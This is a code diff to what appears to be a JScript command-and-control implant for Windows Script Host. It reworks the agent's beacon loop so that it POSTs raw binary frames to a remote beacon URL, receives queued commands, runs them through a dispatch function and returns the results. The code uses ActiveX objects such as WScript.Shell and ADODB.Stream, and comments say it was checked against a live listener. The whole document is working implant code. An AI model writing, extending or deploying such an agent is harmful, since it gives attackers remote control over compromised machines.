@@ -2,7 +2,6 @@ function runAgent() {
     var CAN_ECHO = (typeof WScript != 'undefined');
     var shell = null, identityHeaders = null, exiting = false;
     var clrVersion = 'v4.0.30319';
-    var HEX_DIGITS = '0123456789abcdef';
     function ensureShell() {
         if (!shell) shell = new ActiveXObject('WScript.Shell');
     }
@@ -16,18 +15,83 @@ function runAgent() {
         var value = shell.ExpandEnvironmentStrings('%' + name + '%');
         return (value == '%' + name + '%') ? '' : value;
     }
-    function bytesToHex(bytes) {
-        var hex = '';
-        for (var i = 0; i < bytes.length; i++) hex += HEX_DIGITS.charAt(bytes[i] >> 4) + HEX_DIGITS.charAt(bytes[i] & 15);
-        return hex;
+    function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
+    // ── v3 beacon framing (RAW BINARY bodies) ───────────────────────
+    // The body is a stream of [u32le length][bytes] frames; one POST carries every
+    // response owed since the last one, and the answer carries every queued
+    // command (same contract as the C# agent — no encoding negotiation).
+    //
+    // JScript has no byte type, so ADODB.Stream is the COM bridge on both sides:
+    //   SEND  — WriteText with Charset 'iso-8859-1' maps chars 0x00-0xFF to bytes
+    //           1:1 (EMPIRICALLY VERIFIED: the WRITE direction is identity; only
+    //           the read direction applies cp1252 — see below), then switch Type
+    //           to 1 and hand the stream to xhr.send().
+    //   READ  — Write(responseBody), then ReadText: MLang's 'iso-8859-1'/'windows-
+    //           1252' READ decodes bytes 0x80-0x9F as their cp1252 Unicode chars
+    //           (U+20AC etc); CP1252_INVERSE maps those 27 chars back to bytes.
+    //           Everything else decodes 1:1. All 256 byte values round-trip
+    //           (verified under cscript against a live HTTP listener).
+    //   An EMPTY response body must NOT go through the stream (converting a
+    //   zero-length stream throws) — gate on Content-Length first.
+    function bytesToBinString(bytes) {
+        var out = '', i;
+        for (i = 0; i < bytes.length; i += 4096) {
+            var chunk = '';
+            for (var j = i; j < i + 4096 && j < bytes.length; j++) chunk += String.fromCharCode(bytes[j]);
+            out += chunk;
+        }
+        return out;
     }
-    function hexToBytes(hex) {
-        hex = hex.replace(/\s+/g, '');
+    function buildBodyStream(frames) {
+        var text = '';
+        for (var i = 0; i < frames.length; i++) {
+            var f = frames[i];
+            text += String.fromCharCode(f.length & 255, (f.length >>> 8) & 255, (f.length >>> 16) & 255, (f.length >>> 24) & 255);
+            text += bytesToBinString(f);
+        }
+        var stream = new ActiveXObject('ADODB.Stream');
+        stream.Type = 2;
+        stream.Charset = 'iso-8859-1';
+        stream.Open();
+        stream.WriteText(text);
+        stream.Position = 0;
+        stream.Type = 1;
+        return stream;
+    }
+    var CP1252_INVERSE = {
+        0x20AC: 0x80, 0x201A: 0x82, 0x0192: 0x83, 0x201E: 0x84, 0x2026: 0x85, 0x2020: 0x86,
+        0x2021: 0x87, 0x02C6: 0x88, 0x2030: 0x89, 0x0160: 0x8A, 0x2039: 0x8B, 0x0152: 0x8C,
+        0x017D: 0x8E, 0x2018: 0x91, 0x2019: 0x92, 0x201C: 0x93, 0x201D: 0x94, 0x2022: 0x95,
+        0x2013: 0x96, 0x2014: 0x97, 0x02DC: 0x98, 0x2122: 0x99, 0x0161: 0x9A, 0x203A: 0x9B,
+        0x0153: 0x9C, 0x017E: 0x9E, 0x0178: 0x9F
+    };
+    function responseToBytes(body) {
+        var stream = new ActiveXObject('ADODB.Stream');
+        stream.Type = 1;
+        stream.Open();
+        stream.Write(body);
+        stream.Position = 0;
+        stream.Type = 2;
+        stream.Charset = 'windows-1252';
+        var text = stream.ReadText(-1);
+        stream.Close();
         var bytes = [];
-        for (var i = 0; i + 1 < hex.length; i += 2) bytes.push(parseInt(hex.substring(i, i + 2), 16));
+        for (var i = 0; i < text.length; i++) {
+            var c = text.charCodeAt(i);
+            bytes.push(CP1252_INVERSE[c] !== undefined ? CP1252_INVERSE[c] : (c & 255));
+        }
         return bytes;
     }
-    function u32Bytes(n) { return [n & 255, (n >>> 8) & 255, (n >>> 16) & 255, (n >>> 24) & 255]; }
+    function parseFrames(bytes) {
+        var frames = [], i = 0;
+        while (i + 4 <= bytes.length) {
+            var len = (bytes[i] | (bytes[i + 1] << 8) | (bytes[i + 2] << 16) | (bytes[i + 3] << 24)) >>> 0;
+            i += 4;
+            frames.push(bytes.slice(i, i + len));
+            i += len;
+        }
+        return frames;
+    }
     function base64ToStream(base64, byteLength) {
         var encoding = new ActiveXObject('System.Text.ASCIIEncoding');
         var encodedLength = encoding.GetByteCount_2(base64);
@@ -161,7 +225,7 @@ function runAgent() {
     if (!beaconUrl) { log('beacon endpoint not set'); return 'fail'; }
     identityHeaders = buildIdentity();
     log('JScript agent beaconing to ' + beaconUrl + ' as ' + identityHeaders[1][1]);
-    var pendingHex = '';
+    var pendingReplies = [];
     while (!exiting) {
         var xhr = null;
         try {
@@ -172,7 +236,7 @@ function runAgent() {
             for (var i = 0; i < identityHeaders.length; i++) {
                 try { xhr.setRequestHeader(identityHeaders[i][0], identityHeaders[i][1]); } catch (e3) {}
             }
-            xhr.send(pendingHex);
+            xhr.send(pendingReplies.length ? buildBodyStream(pendingReplies) : '');
         } catch (e) {
             log('beacon failed: ' + (e && e.message ? e.message : e));
             return 'fail';
@@ -181,12 +245,16 @@ function runAgent() {
             log('http ' + xhr.status);
             return 'fail';
         }
-        pendingHex = '';
-        var responseHex = (xhr.responseText || '').replace(/\s+/g, '');
-        if (responseHex.length == 0) { continue; }
-        var replyBytes = dispatchCommand(hexToBytes(responseHex));
-        if (exiting) { log('exit'); return 'exit'; }
-        pendingHex = bytesToHex(replyBytes);
+        pendingReplies = [];
+        // Empty answer = nothing queued — re-POST immediately. The stream conversion
+        // of a zero-length body throws, so gate on Content-Length, never on ''-checks.
+        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { continue; }
+        var frames = parseFrames(responseToBytes(xhr.responseBody));
+        for (var f = 0; f < frames.length && !exiting; f++) {
+            var replyBytes = dispatchCommand(frames[f]);
+            if (exiting) { log('exit'); return 'exit'; }
+            if (replyBytes) pendingReplies.push(replyBytes);
+        }
     }
     return 'exit';
 }
